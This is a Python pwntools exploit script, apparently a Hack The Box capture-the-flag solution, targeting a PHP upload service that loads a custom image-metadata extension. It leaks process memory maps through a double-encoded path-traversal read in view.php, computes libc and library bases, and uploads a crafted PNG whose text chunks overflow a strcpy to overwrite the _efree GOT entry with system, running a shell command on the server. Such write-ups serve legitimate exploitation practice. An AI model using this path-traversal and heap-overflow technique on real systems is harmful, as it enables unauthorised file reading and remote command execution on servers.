#!/usr/bin/env python3

import requests
import base64
import re

from pwn import *
from PIL import Image
from PIL.PngImagePlugin import PngInfo

lib = ELF("./metadata_reader.so")

context.binary = lib

# URL  = "http://154.57.164.70:32413"
URL  = "http://localhost:8000"


def get_base(name: str, maps: str):
    # Matches the first hex address on a line containing the name
    pattern = rf"^([0-9a-f]+)-.*{re.escape(name)}"
    match = re.search(pattern, maps, re.MULTILINE)
    return int(match.group(1), 16) if match else None


"""
`view.php` has a vulnerability that allows us to read any file from the filesystem.
In this way we can leak contents from `/self/proc/maps` and get any leaks we want.
The `metadata_reader.so` library has a function, namely `zif_getImgMetadata` that
uses the unsafe function `strcpy` to copy string over the zend's heap (see a few
more details in the other python script).
"""
def main():
    proc_maps = "%252e%252e/%252e%252e/%252e%252e/%252e%252e/proc/self/maps"
    r = requests.post(URL + "/view.php?image=" + proc_maps)

    # Regex to grab everything between 'base64,' and the next '"'
    match = re.search(rb'base64,([^"]+)', r.content)
    if match:
        leak = base64.b64decode(match.group(1)).decode('utf-8', errors='ignore')

    php_base    = get_base("/usr/local/bin/php", leak)
    libc_base   = get_base("libc.so.6", leak)
    heap_base   = get_base("[heap]", leak)
    stack_base  = get_base("[stack]", leak)
    lib.address = get_base("metadata_reader.so", leak)

    log.info(f"php base: 0x{php_base:x}")
    log.info(f"libc: 0x{libc_base:x}")
    log.info(f"heap: 0x{heap_base:x}")
    log.info(f"stack: 0x{stack_base:x}")
    log.info(f"metadata_reader: 0x{lib.address:x}")

    # NOTE: For some reason, when you install `gdb`, `gdbserver` and `socat`
    #       the libc version gets changed and so the offsets as well.
    #       (credit: @minipif on discord).
    # 
    #       We'll differentiate this with DEBUGGING if the service is ran
    #       through `gdbserver` or not.
    if args.DEBUGGING:
        libc_system = libc_base + 0x4c490
    else:
        libc_system = libc_base + 0x4c3a0

    # The payload will search for the string "HTB" inside every file in the current directory
    # and save the found line(s) in the file called "flag.txt".
    payload = "grep -r \"HTB\" . > flag.txt;".encode("ascii")

    target = PngInfo()
    target.add_text("Title", payload.ljust(0x38, b"A") + p64(lib.got["_efree"]))
    target.add_text("Artist", b"B" * 0x30)             # "Consume" a chunk
    target.add_text("Copyright", p64(libc_system))

    img = Image.new("RGB", (10, 10), color="red")
    img.save("exploit.png", pnginfo=target)

    files = {'file': ('exploit.png', open('exploit.png', 'rb'), 'image/png')}
    r = requests.post(URL + "/upload.php", files=files)

    log.success("Sent PNG with payload!")
    log.info(f"Check {URL}/flag.txt")


if __name__ == "__main__":
    main()
